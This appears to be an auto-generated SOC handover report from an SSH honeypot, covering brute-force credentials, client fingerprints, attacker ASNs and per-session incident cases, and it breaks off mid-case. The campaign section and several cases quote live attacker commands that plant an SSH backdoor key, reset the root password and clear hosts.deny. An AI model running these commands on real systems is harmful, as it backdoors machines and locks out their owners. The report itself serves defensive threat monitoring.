# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-13 |
| **Generated At** | 2026-04-13T15:15:21Z |
| **Shift Time** | 15:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **109** |
| Confirmed Threats | **104** |
| False Positives Filtered | **5** (4.6%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **9** |
| High Severity Cases | **42** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **67** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **98** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **18** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **28** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 42 |
| `345gs5662d34` | 20 |
| `test` | 9 |
| `ubuntu` | 5 |
| `user` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 20 |
| `3245gs5662d34` | 20 |
| `123456` | 4 |
| `Test!2025` | 2 |
| `tester` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `3245gs5662d34` | 20 |
| `test` | `Test!2025` | 2 |
| `jenkins` | `123456` | 2 |
| `test` | `tester` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `27.79.6.34` | 2026-04-13T14:15:59 |
| `root` | `12341234` | `217.154.233.215` | 2026-04-13T14:39:52 |
| `root` | `3245gs5662d34` | `217.154.233.215` | 2026-04-13T14:39:56 |
| `root` | `Aa111222` | `120.48.104.37` | 2026-04-13T14:42:34 |
| `root` | `ccZZ000` | `212.23.133.68` | 2026-04-13T14:42:37 |
| `root` | `3245gs5662d34` | `212.23.133.68` | 2026-04-13T14:42:40 |
| `root` | `root54321#` | `212.23.133.68` | 2026-04-13T14:44:09 |
| `root` | `P@ss1234` | `13.81.183.29` | 2026-04-13T14:44:35 |
| `root` | `3245gs5662d34` | `13.81.183.29` | 2026-04-13T14:44:39 |
| `root` | `P@ss1234` | `212.23.133.68` | 2026-04-13T14:45:36 |
| `root` | `toorroot` | `212.23.133.68` | 2026-04-13T14:47:00 |
| `root` | `root54321#` | `13.81.183.29` | 2026-04-13T14:51:13 |
| `root` | `root000` | `212.23.133.68` | 2026-04-13T14:52:53 |
| `root` | `ZZcc111` | `13.81.183.29` | 2026-04-13T14:52:58 |
| `root` | `zzCC112233` | `212.23.133.68` | 2026-04-13T14:54:21 |
| `root` | `Dd123123` | `13.81.183.29` | 2026-04-13T14:54:37 |
| `root` | `Qwer!234` | `13.81.183.29` | 2026-04-13T14:56:20 |
| `root` | `ccZZ000` | `13.81.183.29` | 2026-04-13T14:57:57 |
| `root` | `ZZcc111` | `212.23.133.68` | 2026-04-13T14:58:54 |
| `root` | `root000` | `13.81.183.29` | 2026-04-13T14:59:32 |
| `root` | `kk112233` | `129.121.79.67` | 2026-04-13T15:01:57 |
| `root` | `3245gs5662d34` | `129.121.79.67` | 2026-04-13T15:02:02 |
| `root` | `ADMIN123` | `41.242.115.84` | 2026-04-13T15:03:27 |
| `root` | `3245gs5662d34` | `41.242.115.84` | 2026-04-13T15:03:33 |
| `root` | `Dd123123` | `212.23.133.68` | 2026-04-13T15:07:34 |
| `root` | `Qwer!234` | `212.23.133.68` | 2026-04-13T15:10:40 |
| `root` | `8ik,!@` | `51.68.65.117` | 2026-04-13T15:11:15 |
| `root` | `3245gs5662d34` | `51.68.65.117` | 2026-04-13T15:11:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **109** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 101 |
| AsyncSSH (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 99 | 8 |
| `fda360b1b4f4...` | Mirai/variant | 2 | 1 |
| `f555226df196...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 99 | 8 | Modern SSH client |
| `fda360b1b4f4...` | AsyncSSH (Python) | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:RqNsUaToPFWs"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.104.37`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `41.242.115.84`, `13.81.183.29`, `129.121.79.67`, `51.68.65.117`, `212.23.133.68`, `217.154.233.215`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **15** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | LOW |
| `AS37613` | DOLPHIN TELECOMMUNICATION LIMITED | 1 | HIGH |
| `AS12329` | GLASFASER RUHR GmbH & Co. KG | 1 | HIGH |
| `AS8560` | IONOS SE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (42)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-abba719d1f2d

| Field | Detail |
|---|---|
| **Source IP** | `27.79.6[.]34` |
| **First Seen** | 2026-04-13 14:15 |
| **Last Seen** | 2026-04-13 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:15:58` | `cowrie.session.connect` |
| `2026-04-13 14:15:58` | `cowrie.client.version` |
| `2026-04-13 14:15:58` | `cowrie.client.kex` |
| `2026-04-13 14:15:59` | `cowrie.login.success` |
| `2026-04-13 14:15:59` | `cowrie.direct-tcpip.request` |
| `2026-04-13 14:15:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-04-13 14:15:59` | `cowrie.direct-tcpip.data` |
| `2026-04-13 14:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.6[.]34` to AbuseIPDB if not already reported
- [ ] Block `27.79.6[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c4f0fbc16c

| Field | Detail |
|---|---|
| **Source IP** | `217.154.233[.]215` |
| **First Seen** | 2026-04-13 14:39 |
| **Last Seen** | 2026-04-13 14:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:39:49` | `cowrie.session.connect` |
| `2026-04-13 14:39:49` | `cowrie.client.version` |
| `2026-04-13 14:39:50` | `cowrie.client.kex` |
| `2026-04-13 14:39:52` | `cowrie.login.success` |
| `2026-04-13 14:39:53` | `cowrie.session.params` |
| `2026-04-13 14:39:53` | `cowrie.command.input` |
| `2026-04-13 14:39:53` | `cowrie.command.failed` |
| `2026-04-13 14:39:53` | `cowrie.log.closed` |
| `2026-04-13 14:39:53` | `cowrie.session.params` |
| `2026-04-13 14:39:53` | `cowrie.command.input` |
| `2026-04-13 14:39:53` | `cowrie.session.file_download` |
| `2026-04-13 14:39:53` | `cowrie.log.closed` |
| `2026-04-13 14:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.233[.]215` to AbuseIPDB if not already reported
- [ ] Block `217.154.233[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d35e413c7a

| Field | Detail |
|---|---|
| **Source IP** | `217.154.233[.]215` |
| **First Seen** | 2026-04-13 14:39 |
| **Last Seen** | 2026-04-13 14:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:39:55` | `cowrie.session.connect` |
| `2026-04-13 14:39:55` | `cowrie.client.version` |
| `2026-04-13 14:39:55` | `cowrie.client.kex` |
| `2026-04-13 14:39:56` | `cowrie.login.success` |
| `2026-04-13 14:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.233[.]215` to AbuseIPDB if not already reported
- [ ] Block `217.154.233[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f7fe7a54c2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.104[.]37` |
| **First Seen** | 2026-04-13 14:42 |
| **Last Seen** | 2026-04-13 14:43 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RqNsUaToPFWs"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:42:32` | `cowrie.session.connect` |
| `2026-04-13 14:42:32` | `cowrie.client.version` |
| `2026-04-13 14:42:33` | `cowrie.client.kex` |
| `2026-04-13 14:42:34` | `cowrie.login.success` |
| `2026-04-13 14:42:34` | `cowrie.session.params` |
| `2026-04-13 14:42:34` | `cowrie.command.input` |
| `2026-04-13 14:42:34` | `cowrie.command.failed` |
| `2026-04-13 14:42:35` | `cowrie.log.closed` |
| `2026-04-13 14:42:35` | `cowrie.session.params` |
| `2026-04-13 14:42:35` | `cowrie.command.input` |
| `2026-04-13 14:42:36` | `cowrie.session.file_download` |
| `2026-04-13 14:42:36` | `cowrie.log.closed` |
| `2026-04-13 14:42:54` | `cowrie.session.params` |
| `2026-04-13 14:42:54` | `cowrie.command.input` |
| `2026-04-13 14:42:54` | `cowrie.log.closed` |
| `2026-04-13 14:42:55` | `cowrie.session.params` |
| `2026-04-13 14:42:55` | `cowrie.command.input` |
| `2026-04-13 14:42:55` | `cowrie.log.closed` |
| `2026-04-13 14:42:56` | `cowrie.session.params` |
| `2026-04-13 14:42:56` | `cowrie.command.input` |
| `2026-04-13 14:42:56` | `cowrie.session.file_download` |
| `2026-04-13 14:42:56` | `cowrie.log.closed` |
| `2026-04-13 14:42:56` | `cowrie.session.params` |
| `2026-04-13 14:42:56` | `cowrie.command.input` |
| `2026-04-13 14:42:57` | `cowrie.log.closed` |
| `2026-04-13 14:42:57` | `cowrie.session.params` |
| `2026-04-13 14:42:57` | `cowrie.command.input` |
| `2026-04-13 14:42:58` | `cowrie.log.closed` |
| `2026-04-13 14:42:58` | `cowrie.session.params` |
| `2026-04-13 14:42:58` | `cowrie.command.input` |
| `2026-04-13 14:42:58` | `cowrie.command.input` |
| `2026-04-13 14:42:59` | `cowrie.log.closed` |
| `2026-04-13 14:43:00` | `cowrie.session.params` |
| `2026-04-13 14:43:00` | `cowrie.command.input` |
| `2026-04-13 14:43:01` | `cowrie.log.closed` |
| `2026-04-13 14:43:01` | `cowrie.session.params` |
| `2026-04-13 14:43:01` | `cowrie.command.input` |
| `2026-04-13 14:43:02` | `cowrie.log.closed` |
| `2026-04-13 14:43:02` | `cowrie.session.params` |
| `2026-04-13 14:43:02` | `cowrie.command.input` |
| `2026-04-13 14:43:02` | `cowrie.log.closed` |
| `2026-04-13 14:43:03` | `cowrie.session.params` |
| `2026-04-13 14:43:03` | `cowrie.command.input` |
| `2026-04-13 14:43:03` | `cowrie.log.closed` |
| `2026-04-13 14:43:04` | `cowrie.session.params` |
| `2026-04-13 14:43:04` | `cowrie.command.input` |
| `2026-04-13 14:43:04` | `cowrie.log.closed` |
| `2026-04-13 14:43:05` | `cowrie.session.params` |
| `2026-04-13 14:43:05` | `cowrie.command.input` |
| `2026-04-13 14:43:05` | `cowrie.log.closed` |
| `2026-04-13 14:43:06` | `cowrie.session.params` |
| `2026-04-13 14:43:06` | `cowrie.command.input` |
| `2026-04-13 14:43:06` | `cowrie.log.closed` |
| `2026-04-13 14:43:07` | `cowrie.session.params` |
| `2026-04-13 14:43:07` | `cowrie.command.input` |
| `2026-04-13 14:43:08` | `cowrie.log.closed` |
| `2026-04-13 14:43:08` | `cowrie.session.params` |
| `2026-04-13 14:43:08` | `cowrie.command.input` |
| `2026-04-13 14:43:09` | `cowrie.log.closed` |
| `2026-04-13 14:43:09` | `cowrie.session.params` |
| `2026-04-13 14:43:09` | `cowrie.command.input` |
| `2026-04-13 14:43:10` | `cowrie.log.closed` |
| `2026-04-13 14:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.104[.]37` to AbuseIPDB if not already reported
- [ ] Block `120.48.104[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615b55a9e0bc

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:42 |
| **Last Seen** | 2026-04-13 14:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:42:36` | `cowrie.session.connect` |
| `2026-04-13 14:42:36` | `cowrie.client.version` |
| `2026-04-13 14:42:36` | `cowrie.client.kex` |
| `2026-04-13 14:42:37` | `cowrie.login.success` |
| `2026-04-13 14:42:37` | `cowrie.session.params` |
| `2026-04-13 14:42:37` | `cowrie.command.input` |
| `2026-04-13 14:42:37` | `cowrie.command.failed` |
| `2026-04-13 14:42:37` | `cowrie.log.closed` |
| `2026-04-13 14:42:37` | `cowrie.session.params` |
| `2026-04-13 14:42:37` | `cowrie.command.input` |
| `2026-04-13 14:42:37` | `cowrie.session.file_download` |
| `2026-04-13 14:42:37` | `cowrie.log.closed` |
| `2026-04-13 14:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec4eee0b3348

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:42 |
| **Last Seen** | 2026-04-13 14:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:42:40` | `cowrie.session.connect` |
| `2026-04-13 14:42:40` | `cowrie.client.version` |
| `2026-04-13 14:42:40` | `cowrie.client.kex` |
| `2026-04-13 14:42:40` | `cowrie.login.success` |
| `2026-04-13 14:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2315f8ab6adb

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:44 |
| **Last Seen** | 2026-04-13 14:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:44:08` | `cowrie.session.connect` |
| `2026-04-13 14:44:08` | `cowrie.client.version` |
| `2026-04-13 14:44:08` | `cowrie.client.kex` |
| `2026-04-13 14:44:09` | `cowrie.login.success` |
| `2026-04-13 14:44:09` | `cowrie.session.params` |
| `2026-04-13 14:44:09` | `cowrie.command.input` |
| `2026-04-13 14:44:09` | `cowrie.command.failed` |
| `2026-04-13 14:44:09` | `cowrie.log.closed` |
| `2026-04-13 14:44:10` | `cowrie.session.params` |
| `2026-04-13 14:44:10` | `cowrie.command.input` |
| `2026-04-13 14:44:10` | `cowrie.session.file_download` |
| `2026-04-13 14:44:10` | `cowrie.log.closed` |
| `2026-04-13 14:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81570d6cb3e4

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:44 |
| **Last Seen** | 2026-04-13 14:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:44:12` | `cowrie.session.connect` |
| `2026-04-13 14:44:12` | `cowrie.client.version` |
| `2026-04-13 14:44:12` | `cowrie.client.kex` |
| `2026-04-13 14:44:13` | `cowrie.login.success` |
| `2026-04-13 14:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27397f8b8f32

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:44 |
| **Last Seen** | 2026-04-13 14:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:44:35` | `cowrie.session.connect` |
| `2026-04-13 14:44:35` | `cowrie.client.version` |
| `2026-04-13 14:44:35` | `cowrie.client.kex` |
| `2026-04-13 14:44:35` | `cowrie.login.success` |
| `2026-04-13 14:44:36` | `cowrie.session.params` |
| `2026-04-13 14:44:36` | `cowrie.command.input` |
| `2026-04-13 14:44:36` | `cowrie.command.failed` |
| `2026-04-13 14:44:36` | `cowrie.log.closed` |
| `2026-04-13 14:44:36` | `cowrie.session.params` |
| `2026-04-13 14:44:36` | `cowrie.command.input` |
| `2026-04-13 14:44:36` | `cowrie.session.file_download` |
| `2026-04-13 14:44:36` | `cowrie.log.closed` |
| `2026-04-13 14:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa56a18a10fc

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:44 |
| **Last Seen** | 2026-04-13 14:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:44:39` | `cowrie.session.connect` |
| `2026-04-13 14:44:39` | `cowrie.client.version` |
